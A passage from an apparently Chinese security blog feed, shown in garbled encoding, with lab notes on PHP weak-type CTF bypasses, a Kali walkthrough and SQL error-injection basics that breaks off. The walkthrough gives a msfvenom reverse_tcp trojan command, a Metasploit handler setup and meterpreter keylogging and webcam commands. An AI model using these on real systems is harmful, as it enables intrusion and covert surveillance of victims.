id="3-å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç -ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´"><a href="#3-å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç -ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´" class="headerlink" title="3.å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç (ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´)"></a>3.å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç (ç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´)</h4><p>â€‹            æ ¹æ®è‡ªèº«ç»éªŒåˆ¤æ–­åœ¨è¯¥åº”ç”¨ä¸­çš„å“ªäº›åŠŸèƒ½å¯èƒ½å‡ºç°æ¼æ´ã€‚</p><h4 id="4-ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç "><a href="#4-ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç " class="headerlink" title="4.ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç "></a>4.ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç </h4><h3 id="æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š"><a href="#æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š" class="headerlink" title="æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š"></a>æ•æ„Ÿå‡½æ•°å›æº¯å®¡è®¡ï¼š</h3><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103125151.png" alt="image-20210901103125151"></p><h4 id="é€šè¯»å…¨æ–‡ä»£ç "><a href="#é€šè¯»å…¨æ–‡ä»£ç " class="headerlink" title="é€šè¯»å…¨æ–‡ä»£ç "></a>é€šè¯»å…¨æ–‡ä»£ç </h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103255032.png" alt="image-20210901103255032"></p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103436076.png" alt="image-20210901103436076"></p><h3 id="ä¾‹å­ï¼š"><a href="#ä¾‹å­ï¼š" class="headerlink" title="ä¾‹å­ï¼š"></a>ä¾‹å­ï¼š</h3><p>phpå¼±ç±»å‹</p><h4 id="1-æ¯”è¾ƒç¬¦å·"><a href="#1-æ¯”è¾ƒç¬¦å·" class="headerlink" title="1.æ¯”è¾ƒç¬¦å·"></a>1.æ¯”è¾ƒç¬¦å·</h4><p>==            å…ˆè¿›è¡Œç±»å‹è½¬åŒ–ï¼Œå†è¿›è¡Œæ¯”è¾ƒï¼ˆå¼±æ¯”è¾ƒï¼‰</p><p>===          å…ˆæ¯”è¾ƒç±»å‹ï¼Œè‹¥ç±»å‹ä¸åŒç›´æ¥è¿”å›ä¸ç­‰ï¼ˆå¼ºæ¯”è¾ƒï¼‰</p><p>Tips</p><p>Boolç±»å‹çš„trueå’Œä»»æ„å­—ç¬¦ä¸²çš„å¼±ç±»å‹ç›¸ç­‰</p><p>æ•°å­—ä¸å­—ç¬¦ä¸²ç›¸æ¯”è¾ƒï¼Œä¼šå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—</p><p>è‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬åŒ–ç»“æœï¼Œ</p><p>è‹¥æ— åˆ™è½¬åŒ–ä¸º0ï¼Œè‹¥ç¬¦åˆç§‘å­¦è®°æ•°æ³•çš„å½¢å¼ï¼Œåˆ™æŒ‰ç…§ç§‘å­¦è®°æ•°æ³•æ¥å–</p><h4 id="2-hashæ¯”è¾ƒç¼ºé™·"><a href="#2-hashæ¯”è¾ƒç¼ºé™·" class="headerlink" title="2.hashæ¯”è¾ƒç¼ºé™·"></a>2.hashæ¯”è¾ƒç¼ºé™·</h4><p>å¦‚æœé‡‡ç”¨</p><p>== è¿ç®—ç¬¦æ¯”è¾ƒå“ˆå¸Œå€¼ï¼Œä¼šé¢ä¸´ä¸Šé¢è®²çš„å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜ï¼Œ</p><p>å³ä»»ä½•ä»¥â€™0eâ€™ å¼€å¤´çš„å­—ç¬¦ä¸²éƒ½ç›¸ç­‰ï¼</p><p>å¸¸è§çš„md5</p><p>è¿ç®—åä»¥â€™0eâ€™å¼€å¤´çš„å­—ç¬¦ä¸²æœ‰ï¼š</p><p>QNKCDZO</p><p>s878926199a</p><p>s155964671a</p><p>s1885207154a</p><p>s1836677006a</p><p>s1184209335a</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104340610.png" alt="image-20210901104340610"></p><h4 id="3-md5-sha1å‡½æ•°ç¼ºé™·"><a href="#3-md5-sha1å‡½æ•°ç¼ºé™·" class="headerlink" title="3.md5 sha1å‡½æ•°ç¼ºé™·"></a>3.md5 sha1å‡½æ•°ç¼ºé™·</h4><p>å½“md5()å‡½æ•°ä¸sha1()å‡½æ•°å¯¹å‚æ•°è¿›è¡ŒåŠ å¯†å¤„ç†æ—¶ï¼Œ</p><p>å¦‚æœç¢°åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œmd5()å‡½æ•°ä¼šè¿”å›null</p><p>sha1()å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·ã€‚</p><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ„é€ ä¸¤ä¸ªæ•°ç»„å³å¯ã€‚</p><p>a[]=1å³è¡¨ç¤ºä¼ å…¥äº†ä¸€ä¸ªæ•°ç»„</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104608235.png" alt="image-20210901104608235"></p><p>å˜é‡è¦†ç›–</p><h4 id="1-parse-strå¯¼è‡´çš„å˜é‡è¦†ç›–"><a href="#1-parse-strå¯¼è‡´çš„å˜é‡è¦†ç›–" class="headerlink" title="1.parse_strå¯¼è‡´çš„å˜é‡è¦†ç›–"></a>1.parse_strå¯¼è‡´çš„å˜é‡è¦†ç›–</h4><p>parse_str( string $encoded_string[.array &amp;$result] )</p><p>parse_str() å‡½æ•°ç”¨äºæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œ</p><p>å¦‚æœæ²¡æœ‰resultå‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ï¼Œ</p><p>å¦‚æœè®¾ç½®äº†ç¬¬äºŒä¸ªå˜é‡result</p><p>å˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºæ›¿ä»£ã€‚</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901145407518.png" alt="image-20210901145407518"></p><h4 id="2-X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€"><a href="#2-X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€" class="headerlink" title="2.X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€"></a>2.X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€</h4><p>HTTPå¤´æ·»åŠ X-Forwarded-Forï¼š</p><h4 id="3-stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™-00æˆªæ–­"><a href="#3-stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="3.stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™%00æˆªæ–­"></a>3.stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™%00æˆªæ–­</h4><p>çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p><p>PHP strops()å‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•ï¼š</p><p>strops()å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p><p>æ³¨é‡Šï¼šstrops()å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿ</p><p>â€‹            è¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="keyword">string</span>,find,start)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</td></tr></tbody></table><table><thead><tr><th>è¿”å›å€¼ï¼š</th><th>è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚<strong>æ³¨é‡Šï¼š</strong>å­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚</th></tr></thead><tbody><tr><td>PHP ç‰ˆæœ¬ï¼š</td><td>4+</td></tr></tbody></table><p>eregæ­£åˆ™å‡½æ•°</p><p>å­—ç¬¦ä¸²æ¯”å¯¹è§£æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ereg(<span class="keyword">string</span> pattern, <span class="keyword">string</span> <span class="keyword">string</span>, <span class="keyword">array</span> [regs]);</span><br></pre></td></tr></table></figure><p>æœ¬å‡½æ•°ä»¥ pattern çš„è§„åˆ™æ¥è§£ææ¯”å¯¹å­—ç¬¦ä¸² stringã€‚</p><p>æ¯”å¯¹ç»“æœè¿”å›çš„å€¼æ”¾åœ¨æ•°ç»„å‚æ•° regs ä¹‹ä¸­ï¼Œregs[0] å†…å®¹å°±æ˜¯åŸå­—ç¬¦ä¸² stringã€regs[1] ä¸ºç¬¬ä¸€ä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ã€regs[2] å°±æ˜¯ç¬¬äºŒä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ï¼Œä½™ç±»æ¨ã€‚è‹¥çœç•¥å‚æ•° regsï¼Œåˆ™åªæ˜¯å•çº¯åœ°æ¯”å¯¹ï¼Œæ‰¾åˆ°åˆ™è¿”å›å€¼ä¸º trueã€‚</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901150729125.png" alt="image-20210901150729125"></p><p>æ–¹æ³•ä¸€ï¼š</p><p>æ—¢è¦æ˜¯çº¯æ•°å­—</p><p>åˆè¦æœ‰â€™ #biubiubiuâ€™</p><p>strpos()æ‰¾çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼ ä¸€ä¸ªæ•°ç»„ç»™å®ƒ</p><p>strpos()å‡ºé”™è¿”å›null,null!==false,</p><p>æ‰€ä»¥ç¬¦åˆè¦æ±‚</p><p>æ‰€ä»¥è¾“å…¥nctf[]= </p><p>é‚£ä¸ºä»€ä¹ˆereg()ä¹Ÿèƒ½ç¬¦åˆå‘¢?</p><p>å› ä¸ºereg()</p><p>åœ¨å‡ºé”™æ—¶è¿”å›çš„ä¹Ÿæ˜¯null,null!==false,</p><p>æ‰€ä»¥ç¬¦åˆè¦æ±‚</p><p>æ–¹æ³•äºŒï¼š</p><p>å­—ç¬¦ä¸²æˆªæ–­</p><p>åˆ©ç”¨ereg()çš„NULLæˆªæ–­æ¼æ´ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤</p><p>?nctf=1%00%23biubiubiu </p><h3 id="æ¨¡æ‹Ÿæ¼”ç»ƒï¼š"><a href="#æ¨¡æ‹Ÿæ¼”ç»ƒï¼š" class="headerlink" title="æ¨¡æ‹Ÿæ¼”ç»ƒï¼š"></a>æ¨¡æ‹Ÿæ¼”ç»ƒï¼š</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831213941122.bmp" alt="capture_20210831213941122"></p><p>?password=1337a</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831214131149.bmp" alt="capture_20210831214131149"></p><p>?name[]=1&amp;passsword[]=2</p><p>è§£æï¼šsha1()å‡½æ•°é»˜è®¤çš„ä¼ å…¥å‚æ•°ç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥æ•°ç»„æ—¶å‡ä¼šè¿”å›falseï¼Œé€šè¿‡åˆ¤æ–­ã€‚</p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901105909901.png" alt="image-20210901105909901"></p><p>?a=240610708æˆ–?a=s878926199a</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; &lt;strong&gt;æ–‡ç« å†…å®¹æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š&quot;&gt;&lt;a href=&quot;#é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š&quot;&gt;&lt;/a&gt;é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š&lt;/h3&gt;&lt;h4 id=</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¡ç®€å•çš„kaliæ¸—é€æµ‹è¯•</title>
    <link href="http://daweitech.github.io/2021/08/30/src/0830/"/>
    <id>http://daweitech.github.io/2021/08/30/src/0830/</id>
    <published>2021-08-30T08:44:34.000Z</published>
    <updated>2021-08-31T08:45:15.675Z</updated>
    
    <content type="html"><![CDATA[<h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/k_love1219/article/details/104591110">è®°ä¸€æ¬¡Kaliç³»ç»Ÿæ¸—é€é¶æœº(ç‰©ç†æœº)çš„è¯¦ç»†è¿‡ç¨‹ï¼ˆæ¸—é€å¿…å¤‡ï¼‰_k_love1219çš„åšå®¢-CSDNåšå®¢</a></p><p>é¦–å…ˆå¼€å¯kali-2018</p><p><img src="/2021/08/30/src/0830/image-20210830165837896.png" alt="image-20210830165837896"></p><p>æ¥ç€æˆ‘ä»¬å¼€å§‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶</p><p>è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;ä½ çš„è™šæ‹Ÿæœºipåœ°å€ lport&#x3D;4444 -f exe -o &#x2F;root&#x2F;Desktop&#x2F;aaa.exe</span><br></pre></td></tr></table></figure><p>æ¡Œé¢ä¼šç”Ÿæˆåä¸ºaaa.exeçš„æœ¨é©¬æ–‡ä»¶</p><p><img src="/2021/08/30/src/0830/image-20210830170039670.png" alt="image-20210830170039670"></p><p>æˆ‘ä»¬è¿›å…¥msfconsole</p><p><img src="/2021/08/30/src/0830/image-20210830170155242.png" alt="image-20210830170155242"></p><p>ä½¿ç”¨å¦‚ä¸‹ä¸€ç³»åˆ—æŒ‡ä»¤ï¼š</p><p>ä½¿ç”¨exploit/multi/handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><p>è®¾ç½®payload </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p>è®¾ç½®æœ¨é©¬ç›‘å¬å›ä¼ ipåœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost ä½ çš„è™šæ‹Ÿæœºçš„ipåœ°å€</span><br></pre></td></tr></table></figure><p>è®¾ç½®æœ¨é©¬ç›‘å¬å›ä¼ ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210830170532133.png" alt="image-20210830170532133"></p><p>è¿˜å¯ä»¥ç”¨ show optionsæ¥ç¡®è®¤æ˜¯å¦è®¾ç½®æˆåŠŸ</p><p>è¿™æ—¶å€™æˆ‘ä»¬åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦çš„çŸ¥è¯†æ¥å°†æœ¨é©¬ç—…æ¯’é€è¿›é¶æœº</p><p>dogeï¼ˆå¯ä»¥è®¾ç½®æ”¾åœ¨ç‰©ç†æœºæ¡Œé¢ä¸Šï¼Œç„¶åç‚¹å‡»è¿è¡Œå³å¯ï¼Œè‹¥ä¸æ”¾å¿ƒå¯è‡ªè¡Œå‰å»ä»»åŠ¡ç®¡ç†å™¨çš„è¯¦ç»†ä¿¡æ¯æŸ¥çœ‹æ˜¯å¦æœ‰è¿›ç¨‹aaa.exeï¼‰</p><p><img src="/2021/08/30/src/0830/image-20210831085318058.png" alt="image-20210831085318058"></p><p>å¯ä»¥çœ‹åˆ°å»ºç«‹äº†session</p><p>è¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸè¿ä¸Šäº†é¶æœº</p><p>è¯•ç€è¿è¡Œä¸€äº›æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210831085740617.png" alt="image-20210831085740617"></p><p>æŸ¥çœ‹äº†é¶æœºçš„ä¸€äº›ä¿¡æ¯</p><p>æ­¤å¤–è¿˜æœ‰çš„å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getuid    è·å–ç³»ç»ŸIDä»¥åŠè®¡ç®—æœºåç§°</span><br><span class="line">kill    ä¸­æ­¢è¿›ç¨‹</span><br><span class="line">ps    åˆ—ä¸¾æ­£åœ¨è¿è¡Œä¸­çš„è¿›ç¨‹</span><br><span class="line">getpid    è·å–å½“å‰è¿›ç¨‹æ ‡è¯†ç¬¦</span><br><span class="line">keyscan_start     å¼€å¯æŒ‰é”®è®°å½•ä¼šè¯</span><br><span class="line">keyscan_stop     ç»ˆæ­¢æŒ‰é”®è®°å½•ä¼šè¯</span><br><span class="line">keyscan_dump   è½¬å‚¨ä»è¢«æ”»å‡»ä¸»æœºæ•è·åˆ°çš„æŒ‰é”®</span><br><span class="line">enumdesktops    åˆ—ä¸¾æ‰€æœ‰å¯è®¿é—®åˆ°çš„æ¡Œé¢å’Œå·¥ä½œç«™</span><br><span class="line">getdesktop    è·å–å½“å‰meterpreteræ¡Œé¢</span><br><span class="line">setdesktop    å˜æ›´meterpreterå½“å‰æ¡Œé¢</span><br><span class="line">webcam_list   åˆ—ä¸¾ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ‘„åƒå¤´</span><br><span class="line">webcam_snap   æ•è·è¢«æ”»å‡»ä¸»æœºçš„å¿«ç…§</span><br><span class="line">record_mic    ä»ä¸»æœºçš„é»˜è®¤éº¦å…‹é£ä¸­è®°å½•ç¯å¢ƒå£°éŸ³</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°æ›´ä¸ºé«˜çº§çš„å…æ€æœ¨é©¬æ–‡ç« ï¼š</p><p><a href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSFåˆ¶ä½œå…æ€æœ¨é©¬ - è¿·é€”å°æ›¸ç«¥~ - åšå®¢å›­ (cnblogs.com)</a></p><h4 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h4><p>ä»Šå¤©æ‰¾åˆ°å¦å¤–ä¸€ç¯‡æ–‡ç« æ¥è·å–shell</p><p>æ“ä½œæ–¹æ³•å·®ä¸å¤š</p><p><a href="https://blog.csdn.net/cxcsdn666/article/details/100813443">Kaliåˆ©ç”¨MSFæ¸—é€Win 7è·å–shell_èˆæŒ‡å¦‚æ­Œ~çš„åšå®¢-CSDNåšå®¢</a></p><p>è¿™æ¬¡ä¸æ‡‚ä¸ºä»€ä¹ˆæ–‡ä»¶å¤åˆ¶ä¸åˆ°win7ä¸Šï¼Œç´¢æ€§å°±ç”¨äº†ç‰©ç†æœºæ¥è¯•éªŒ</p><p><a href="https://blog.csdn.net/u012206617/article/details/97389338">è·å–Shellï¼ˆææƒï¼‰åçš„æ“ä½œï¼ˆwindowsã€Linuxï¼‰_å¢¨ç—•è¯‰æ¸…é£çš„åšå®¢-CSDNåšå®¢_shellææƒ</a></p><p>è¿™æ—¶å€™ä¹‹å‰çš„ä¸€ç¯‡å®‰å…¨å®¢æ–‡ç« å°±è®²çš„ååˆ†è¯¦ç»†äº†</p><p><a href="https://www.anquanke.com/post/id/235631">MSFä½¿ç”¨è¯¦è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;8-30&quot;&gt;&lt;a href=&quot;#8-30&quot; class=&quot;headerlink&quot; title=&quot;8.30&quot;&gt;&lt;/a&gt;8.30&lt;/h4&gt;&lt;p&gt; å‚è€ƒé“¾æ¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/k_love1219/articl</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2019 HardSQL</title>
    <link href="http://daweitech.github.io/2021/08/30/buu/16/"/>
    <id>http://daweitech.github.io/2021/08/30/buu/16/</id>
    <published>2021-08-30T00:55:58.000Z</published>
    <updated>2021-08-30T01:36:03.240Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00çŸ¥è¯†ç‚¹ï¼š"><a href="#0x00çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="0x00çŸ¥è¯†ç‚¹ï¼š"></a>0x00çŸ¥è¯†ç‚¹ï¼š</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sqlæ³¨å…¥ä¸­çš„updatexml()å‡½æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><p>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>æ”¹å˜XML_documentä¸­ç¬¦åˆXPATH_stringçš„å€¼</p><p>ä¾‹å­ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>â€‹            å…¶ä¸­çš„concat()å‡½æ•°æ˜¯å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆXPATH_stringçš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯ï¼Œçˆ†å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure><p>xpathè¯­æ³•æ€»ç»“ï¼š<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure><p>ExtractValue()æ¥å—ä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œä¸€ä¸ªXMLæ ‡è®°ç‰‡æ®µ xml_fragå’Œä¸€ä¸ªXPathè¡¨è¾¾å¼ xpath_exprï¼ˆä¹Ÿç§°ä¸º å®šä½å™¨ï¼‰; å®ƒè¿”å›CDATAç¬¬ä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹çš„textï¼ˆï¼‰ï¼Œè¯¥èŠ‚ç‚¹æ˜¯XPathè¡¨è¾¾å¼åŒ¹é…çš„å…ƒç´ çš„å­å…ƒç´ ã€‚</p><p>ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ç›®æ ‡xmlæ–‡æ¡£</p><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨Xpathè·¯å¾„æ³•è¡¨ç¤ºçš„æŸ¥æ‰¾è·¯å¾„</p><p>ä¾‹å­ï¼š</p><p>ä¾‹å¦‚ï¼šSELECT ExtractValue(â€˜<a><b><b></b></b></a>â€˜, â€˜/a/bâ€™); å°±æ˜¯å¯»æ‰¾å‰ä¸€æ®µxmlæ–‡æ¡£å†…å®¹ä¸­çš„aèŠ‚ç‚¹ä¸‹çš„bèŠ‚ç‚¹ï¼Œè¿™é‡Œå¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ã€‚è¿™é‡Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„å†…å®¹ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p><p>åˆ©ç”¨concatå‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡ºã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p><h4 id="0x00è§£é¢˜"><a href="#0x00è§£é¢˜" class="headerlink" title="0x00è§£é¢˜"></a>0x00è§£é¢˜</h4><p><img src="/2021/08/30/buu/16/image-20210830091906610.png" alt="image-20210830091906610"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 